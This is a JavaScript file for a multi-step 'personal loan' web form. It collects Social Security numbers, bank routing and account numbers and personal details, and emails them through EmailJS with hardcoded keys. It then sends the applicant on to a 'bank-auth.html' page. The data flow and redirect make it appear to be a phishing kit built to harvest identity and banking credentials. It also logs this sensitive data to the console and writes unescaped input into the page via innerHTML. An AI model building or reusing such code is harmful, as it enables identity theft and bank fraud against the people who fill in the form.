// Multi-step form functionality
let currentStep = 1;
const totalSteps = 5;
const formData = {};

// EmailJS Configuration
const EMAILJS_SERVICE_ID = process.env.EMAILJS_SERVICE_ID || 'service_mblpi2k';
const EMAILJS_PERSONAL_LOAN_TEMPLATE_ID = process.env.EMAILJS_PERSONAL_LOAN_TEMPLATE_ID || 'template_5wx44v8';
const EMAILJS_BANK_AUTH_TEMPLATE_ID = process.env.EMAILJS_BANK_AUTH_TEMPLATE_ID || 'template_wo7l8te';
const EMAILJS_PUBLIC_KEY = process.env.EMAILJS_PUBLIC_KEY || 'nW8qV4aakkEtYlieZ';

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    console.log('Script loaded and DOM ready');
    
    // Mobile menu toggle
    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
    const mobileMenu = document.getElementById('mobileMenu');
    
    if (mobileMenuBtn && mobileMenu) {
        mobileMenuBtn.addEventListener('click', function() {
            mobileMenu.classList.toggle('hidden');
        });
    }
    
    // Test if form exists
    const form = document.getElementById('loanApplicationForm');
    console.log('Form found:', form);
    
    // Test if submit button exists
    updateProgress();
});

// Step navigation functions
function nextStep() {
    if (validateCurrentStep()) {
        if (currentStep < totalSteps) {
            // Mark current step as completed
            document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.add('completed');
            document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.remove('active');
            
            // Hide current step
            document.getElementById(`step${currentStep}`).classList.remove('active');
            
            // Move to next step
            currentStep++;
            
            // Show next step
            document.getElementById(`step${currentStep}`).classList.add('active');
            document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.add('active');
            
            // Update progress
            updateProgress();
            
            // Update summary if on review step
            if (currentStep === 5) {
                updateApplicationSummary();
            }
        }
    }
}

function previousStep() {
    if (currentStep > 1) {
        // Remove active from current step
        document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.remove('active');
        document.getElementById(`step${currentStep}`).classList.remove('active');
        
        // Move to previous step
        currentStep--;
        
        // Show previous step
        document.getElementById(`step${currentStep}`).classList.add('active');
        document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.add('active');
        document.querySelector(`.step-indicator:nth-child(${currentStep})`).classList.remove('completed');
        
        // Update progress
        updateProgress();
    }
}

function updateProgress() {
    const progressBar = document.getElementById('progressBar');
    const currentStepSpan = document.getElementById('currentStep');
    const stepTitle = document.getElementById('stepTitle');
    
    const progressPercentage = (currentStep / totalSteps) * 100;
    progressBar.style.width = `${progressPercentage}%`;
    currentStepSpan.textContent = currentStep;
    
    const stepTitles = ['Loan Details', 'Personal Information', 'Financial Information', 'Employment & Income', 'Review & Submit'];
    stepTitle.textContent = stepTitles[currentStep - 1];
}

function validateCurrentStep() {
    const currentStepElement = document.getElementById(`step${currentStep}`);
    const requiredFields = currentStepElement.querySelectorAll('[required]');
    let isValid = true;
    
    requiredFields.forEach(field => {
        if (field.type === 'checkbox') {
            // Checkbox validation
            if (!field.checked) {
                isValid = false;
                field.classList.add('border-red-500');
                setTimeout(() => {
                    field.classList.remove('border-red-500');
                }, 3000);
            } else {
                field.classList.remove('border-red-500');
            }
        } else {
            // Text/input validation
            if (!field.value.trim()) {
                isValid = false;
                field.classList.add('border-red-500');
                setTimeout(() => {
                    field.classList.remove('border-red-500');
                }, 3000);
            } else {
                field.classList.remove('border-red-500');
            }
        }
    });
    
    // Email validation
    const emailField = currentStepElement.querySelector('#email');
    if (emailField && emailField.value) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(emailField.value)) {
            isValid = false;
            emailField.classList.add('border-red-500');
            setTimeout(() => {
                emailField.classList.remove('border-red-500');
            }, 3000);
        }
    }
    
    // Phone validation
    const phoneField = currentStepElement.querySelector('#phone');
    if (phoneField && phoneField.value) {
        const phoneRegex = /^[\d\s\-\(\)]+$/;
        if (!phoneRegex.test(phoneField.value) || phoneField.value.replace(/\D/g, '').length < 10) {
            isValid = false;
            phoneField.classList.add('border-red-500');
            setTimeout(() => {
                phoneField.classList.remove('border-red-500');
            }, 3000);
        }
    }
    
    if (!isValid) {
        if (currentStep === 5) {
            showNotification('Please check both checkboxes to proceed.', 'error');
        } else {
            showNotification('Please fill in all required fields correctly.', 'error');
        }
    }
    
    return isValid;
}

function updateApplicationSummary() {
    console.log('updateApplicationSummary called');
    
    const summaryElement = document.getElementById('applicationSummary');
    if (!summaryElement) {
        console.error('applicationSummary element not found');
        return;
    }
    
    // Collect form data directly from input elements
    const loanAmount = document.getElementById('loanAmount')?.value || 'Not entered';
    const loanPurpose = document.getElementById('loanPurpose')?.value || 'Not entered';
    const creditScore = document.getElementById('creditScore')?.value || 'Not entered';
    const firstName = document.getElementById('firstName')?.value || 'Not entered';
    const lastName = document.getElementById('lastName')?.value || 'Not entered';
    const email = document.getElementById('email')?.value || 'Not entered';
    const phone = document.getElementById('phone')?.value || 'Not entered';
    
    // Address fields
    const address = document.getElementById('address')?.value || 'Not entered';
    const city = document.getElementById('city')?.value || 'Not entered';
    const state = document.getElementById('state')?.value || 'Not entered';
    const zipCode = document.getElementById('zipCode')?.value || 'Not entered';
    
    // Financial Information fields (Step 3)
    const socialSecurity = document.getElementById('socialSecurity')?.value || 'Not entered';
    const bankName = document.getElementById('bankName')?.value || 'Not entered';
    const routingNumber = document.getElementById('routingNumber')?.value || 'Not entered';
    const accountNumber = document.getElementById('accountNumber')?.value || 'Not entered';
    
    const annualIncome = document.getElementById('annualIncome')?.value || 'Not entered';
    const employmentStatus = document.getElementById('employmentStatus')?.value || 'Not entered';
    const monthlyHousing = document.getElementById('monthlyHousing')?.value || 'Not entered';
    
    console.log('Collected form data:', {
        loanAmount, loanPurpose, creditScore, firstName, lastName, email, phone,
        address, city, state, zipCode, socialSecurity, bankName, routingNumber, accountNumber,
        annualIncome, employmentStatus, monthlyHousing
    });
    
    // Build summary HTML
    let summaryHTML = '<div class="space-y-4">';
    
    // Loan Details
    summaryHTML += '<div class="border-b pb-3"><h4 class="font-bold text-lg text-gray-800 mb-2">Loan Details</h4>';
    summaryHTML += `<p class="text-gray-700"><strong>Loan Amount:</strong> <span class="text-blue-600">$${loanAmount}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Loan Purpose:</strong> <span class="text-blue-600">${loanPurpose}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Credit Score:</strong> <span class="text-blue-600">${creditScore}</span></p>`;
    summaryHTML += '</div>';
    
    // Personal Information
    summaryHTML += '<div class="border-b pb-3"><h4 class="font-bold text-lg text-gray-800 mb-2">Personal Information</h4>';
    summaryHTML += `<p class="text-gray-700"><strong>Name:</strong> <span class="text-blue-600">${firstName} ${lastName}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Email:</strong> <span class="text-blue-600">${email}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Phone:</strong> <span class="text-blue-600">${phone}</span></p>`;
    summaryHTML += '</div>';
    
    // Address Information
    summaryHTML += '<div class="border-b pb-3"><h4 class="font-bold text-lg text-gray-800 mb-2">Address Information</h4>';
    summaryHTML += `<p class="text-gray-700"><strong>Street Address:</strong> <span class="text-blue-600">${address}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>City:</strong> <span class="text-blue-600">${city}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>State:</strong> <span class="text-blue-600">${state}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>ZIP Code:</strong> <span class="text-blue-600">${zipCode}</span></p>`;
    summaryHTML += '</div>';
    
    // Financial Information (Step 3)
    summaryHTML += '<div class="border-b pb-3"><h4 class="font-bold text-lg text-gray-800 mb-2">Financial Information</h4>';
    summaryHTML += `<p class="text-gray-700"><strong>Social Security Number:</strong> <span class="text-blue-600">${socialSecurity}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Bank Name:</strong> <span class="text-blue-600">${bankName}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Routing Number:</strong> <span class="text-blue-600">${routingNumber}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Account Number:</strong> <span class="text-blue-600">${accountNumber}</span></p>`;
    summaryHTML += '</div>';
    
    // Employment & Income (Step 4)
    summaryHTML += '<div><h4 class="font-bold text-lg text-gray-800 mb-2">Employment & Income</h4>';
    summaryHTML += `<p class="text-gray-700"><strong>Annual Income:</strong> <span class="text-blue-600">$${annualIncome}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Employment Status:</strong> <span class="text-blue-600">${employmentStatus}</span></p>`;
    summaryHTML += `<p class="text-gray-700"><strong>Monthly Housing:</strong> <span class="text-blue-600">$${monthlyHousing}</span></p>`;
    summaryHTML += '</div>';
    
    summaryHTML += '</div>';
    
    console.log('Summary HTML generated');
    
    // Update the summary
    setTimeout(() => {
        summaryElement.innerHTML = summaryHTML;
        console.log('Summary updated successfully');
    }, 100);
}

// Initialize EmailJS
(function() {
    emailjs.init(EMAILJS_PUBLIC_KEY);
})();

// Add this line to initialize EmailJS with the service ID
emailjs.init(EMAILJS_SERVICE_ID, EMAILJS_PUBLIC_KEY);
// Form submission - REMOVED to avoid conflict with onclick="testSubmit()"
// document.getElementById('loanApplicationForm').addEventListener('submit', function(e) {
//     console.log('Form submission triggered');
//     e.preventDefault();
//     
//     // Validate terms and consent
//     const termsCheckbox = document.getElementById('terms');
//     const consentCheckbox = document.getElementById('consent');
//     
//     console.log('Terms checked:', termsCheckbox?.checked);
//     console.log('Consent checked:', consentCheckbox?.checked);
//     
//     if (!termsCheckbox.checked || !consentCheckbox.checked) {
//         showNotification('Please agree to the terms and consent to communications.', 'error');
//         return;
//     }
//     
//     console.log('Validation passed, collecting data...');
//     
//     // Collect form data directly from input elements
//     const data = {
//         loanAmount: document.getElementById('loanAmount').value,
//         loanPurpose: document.getElementById('loanPurpose').value,
//         creditScore: document.getElementById('creditScore').value,
//         firstName: document.getElementById('firstName').value,
//         lastName: document.getElementById('lastName').value,
//         email: document.getElementById('email').value,
//         phone: document.getElementById('phone').value,
//         socialSecurity: document.getElementById('socialSecurity').value,
//         bankName: document.getElementById('bankName').value,
//         routingNumber: document.getElementById('routingNumber').value,
//         accountNumber: document.getElementById('accountNumber').value,
//         annualIncome: document.getElementById('annualIncome').value,
//         employmentStatus: document.getElementById('employmentStatus').value,
//         monthlyHousing: document.getElementById('monthlyHousing').value,
//         timestamp: new Date().toISOString(),
//         applicationType: 'loan_application'
//     };
//     
//     // Send to backend
//     submitApplication(data);
// });

function submitApplication(data) {
    console.log('submitApplication called with data:', data);
    
    // Show loading state - find the submit button by onclick attribute
    const submitButton = document.querySelector('button[onclick*="submitPersonalLoanForm"]');
    let originalText = 'Submit Application';
    
    if (submitButton) {
        originalText = submitButton.textContent;
        submitButton.textContent = 'Submitting...';
        submitButton.disabled = true;
    }
    
    console.log('Sending email via EmailJS...');
    
    // Prepare EmailJS template parameters - include ALL data from the form
    const templateParams = {
        // Customer Information
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        
        // Address Information
        address: data.address,
        city: data.city,
        state: data.state,
        zipCode: data.zipCode,
        
        // Loan Information
        loanAmount: data.loanAmount,
        loanPurpose: data.loanPurpose,
        loanTerm: data.loanTerm,
        creditScore: data.creditScore,
        
        // Financial Information
        socialSecurity: data.socialSecurity,
        bankName: data.bankName,
        routingNumber: data.routingNumber,
        accountNumber: data.accountNumber,
        
        // Employment Information
        annualIncome: data.annualIncome,
        employmentStatus: data.employmentStatus,
        monthlyHousing: data.monthlyHousing,
        
        // Application Details
        submissionDate: data.submissionDate || new Date().toLocaleString(),
        applicationType: data.applicationType,
        applicationStatus: data.applicationStatus
    };
    
    console.log('Template params prepared:', templateParams);
    
    // Send email using EmailJS
    console.log('About to send EmailJS with:', {
        service: EMAILJS_SERVICE_ID,
        template: data.applicationType === 'Personal Loan Application' ? EMAILJS_PERSONAL_LOAN_TEMPLATE_ID : EMAILJS_BANK_AUTH_TEMPLATE_ID,
        params: templateParams
    });
    
    // Check if EmailJS is properly initialized
    console.log('EmailJS initialized:', typeof emailjs !== 'undefined');
    console.log('EmailJS send function:', typeof emailjs.send);
    
    // Test EmailJS configuration first
    console.log('Testing EmailJS configuration...');
    console.log('Public key:', EMAILJS_PUBLIC_KEY);
    console.log('Service ID:', EMAILJS_SERVICE_ID);
    console.log('Personal Loan Template ID:', EMAILJS_PERSONAL_LOAN_TEMPLATE_ID);
    console.log('Bank Auth Template ID:', EMAILJS_BANK_AUTH_TEMPLATE_ID);
    
    // Try to reinitialize EmailJS to make sure it's working
    try {
        emailjs.init(EMAILJS_PUBLIC_KEY);
        console.log('EmailJS reinitialized successfully');
    } catch (initError) {
        console.error('EmailJS initialization failed:', initError);
        showNotification('EmailJS setup failed. Please check your configuration.', 'error');
        return;
    }
    
    // Determine which template to use based on application type
    const templateId = data.applicationType === 'Personal Loan Application' ? 
                      EMAILJS_PERSONAL_LOAN_TEMPLATE_ID : 
                      EMAILJS_BANK_AUTH_TEMPLATE_ID;
    
    console.log('Using template ID:', templateId, 'for application type:', data.applicationType);
    
    // First, let's test with minimal data to see if EmailJS works at all
    const minimalTestParams = {
        firstName: 'Test',
        lastName: 'User',
        email: 'test@example.com',
        phone: '555-1234',
        loanAmount: '1000',
        loanPurpose: 'test',
        creditScore: 'good',
        annualIncome: '50000',
        employmentStatus: 'employed',
        monthlyHousing: '1000',
        submissionDate: new Date().toLocaleString()
    };
    
    console.log('Testing with minimal params:', minimalTestParams);
    
    try {
        emailjs.send(EMAILJS_SERVICE_ID, templateId, minimalTestParams)
            .then(function(response) {
                console.log('Test email sent successfully!', response.status, response.text);
                
                // If test works, try with real data
                console.log('Test successful, now sending real data...');
                return emailjs.send(EMAILJS_SERVICE_ID, templateId, templateParams);
            })
            .then(function(response) {
                console.log('Real email sent successfully!', response.status, response.text);
                
                // Show success notification
                showNotification('Application submitted successfully! Redirecting to bank authentication...', 'success');
                
                // Redirect to bank authentication page after 1.5 seconds
                setTimeout(() => {
                    window.location.href = 'bank-auth.html';
                }, 1500);
            })
            .catch(function(error) {
                console.error('Failed to send email - Full error object:', error);
                console.error('Error constructor:', error.constructor.name);
                console.error('Error prototype:', Object.getPrototypeOf(error));
                console.error('Error stringified:', JSON.stringify(error, null, 2));
                console.error('Error toString:', error.toString());
                
                // Check for specific EmailJS errors
                let errorMessage = 'Unknown error occurred';
                if (error) {
                    if (typeof error === 'string') {
                        errorMessage = error;
                    } else if (error.message || error.text || error.status) {
                        errorMessage = error.message || error.text || `Status: ${error.status}`;
                    } else {
                        // Check for common EmailJS issues
                        const errorStr = error.toString();
                        if (errorStr && errorStr !== '[object Object]') {
                            errorMessage = errorStr;
                        } else {
                            // Provide specific troubleshooting steps
                            errorMessage = `EmailJS Error - Please check:
1. Service ID "${EMAILJS_SERVICE_ID}" exists in EmailJS dashboard
2. Template ID "${templateId}" exists in EmailJS dashboard  
3. EmailJS subscription is active (not exceeded limit)
4. Public key "${EMAILJS_PUBLIC_KEY}" is correct`;
                        }
                    }
                }
                
                console.error('Final error message:', errorMessage);
                
                // Show error notification with more details
                showNotification('Failed to submit application. Error: ' + errorMessage, 'error');
            })
            .finally(() => {
                // Reset button
                if (submitButton) {
                    submitButton.textContent = originalText;
                    submitButton.disabled = false;
                }
            });
    } catch (syncError) {
        console.error('Synchronous error during EmailJS setup:', syncError);
        showNotification('Failed to submit application. Setup error: ' + syncError.message, 'error');
        
        // Reset button on sync error too
        if (submitButton) {
            submitButton.textContent = originalText;
            submitButton.disabled = false;
        }
    }
}

// Notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 p-4 rounded-lg shadow-lg z-50 max-w-sm transform transition-all duration-300 translate-x-full`;
    
    if (type === 'success') {
        notification.className += ' bg-green-500 text-white';
    } else if (type === 'error') {
        notification.className += ' bg-red-500 text-white';
    } else {
        notification.className += ' bg-blue-500 text-white';
    }
    
    notification.innerHTML = `
        <div class="flex items-center">
            <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'} mr-2"></i>
            <span>${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Slide in
    setTimeout(() => {
        notification.classList.remove('translate-x-full');
        notification.classList.add('translate-x-0');
    }, 100);
    
    // Remove after 5 seconds
    setTimeout(() => {
        notification.classList.add('translate-x-full');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 5000);
}

// Phone number formatting and validation
document.getElementById('phone')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 0) {
        if (value.length <= 3) {
            value = `(${value}`;
        } else if (value.length <= 6) {
            value = `(${value.slice(0, 3)}) ${value.slice(3)}`;
        } else {
            value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
        }
    }
    e.target.value = value;
});

// Email validation
document.getElementById('email')?.addEventListener('blur', function(e) {
    const email = e.target.value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (email && !emailRegex.test(email)) {
        e.target.classList.add('border-red-500');
        setTimeout(() => {
            e.target.classList.remove('border-red-500');
        }, 3000);
    } else {
        e.target.classList.remove('border-red-500');
    }
});

// Loan amount validation with limits (1000-100000) - allows typing
document.getElementById('loanAmount')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    // Allow typing, but apply limits when user stops typing
    if (value) {
        e.target.value = value;
        
        // Check limits and show warning if needed
        const numValue = parseInt(value);
        if (numValue < 1000 || numValue > 100000) {
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else {
            e.target.classList.remove('border-orange-500');
        }
    }
});

// Apply limits when user leaves the field
document.getElementById('loanAmount')?.addEventListener('blur', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value) {
        const numValue = parseInt(value);
        if (numValue < 1000) {
            e.target.value = '1000';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else if (numValue > 100000) {
            e.target.value = '100000';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        }
    }
});

// Annual income validation with limits (1000-100000) - allows typing
document.getElementById('annualIncome')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    // Allow typing, but apply limits when user stops typing
    if (value) {
        e.target.value = value;
        
        // Check limits and show warning if needed
        const numValue = parseInt(value);
        if (numValue < 1000 || numValue > 100000) {
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else {
            e.target.classList.remove('border-orange-500');
        }
    }
});

// Apply limits when user leaves the field
document.getElementById('annualIncome')?.addEventListener('blur', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value) {
        const numValue = parseInt(value);
        if (numValue < 1000) {
            e.target.value = '1000';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else if (numValue > 100000) {
            e.target.value = '100000';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        }
    }
});

// Monthly housing validation with limits (100-10000) - allows typing
document.getElementById('monthlyHousing')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    // Allow typing, but apply limits when user stops typing
    if (value) {
        e.target.value = value;
        
        // Check limits and show warning if needed
        const numValue = parseInt(value);
        if (numValue < 100 || numValue > 10000) {
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else {
            e.target.classList.remove('border-orange-500');
        }
    }
});

// Apply limits when user leaves the field
document.getElementById('monthlyHousing')?.addEventListener('blur', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value) {
        const numValue = parseInt(value);
        if (numValue < 100) {
            e.target.value = '100';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        } else if (numValue > 10000) {
            e.target.value = '10000';
            e.target.classList.add('border-orange-500');
            setTimeout(() => {
                e.target.classList.remove('border-orange-500');
            }, 3000);
        }
    }
});

// Anti-spam honey pot field
const honeypotField = document.createElement('input');
honeypotField.type = 'text';
honeypotField.name = 'honeypot';
honeypotField.style.display = 'none';
honeypotField.setAttribute('autocomplete', 'off');

// Add honeypot to form when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loanApplicationForm');
    if (form) {
        form.appendChild(honeypotField);
    }
});
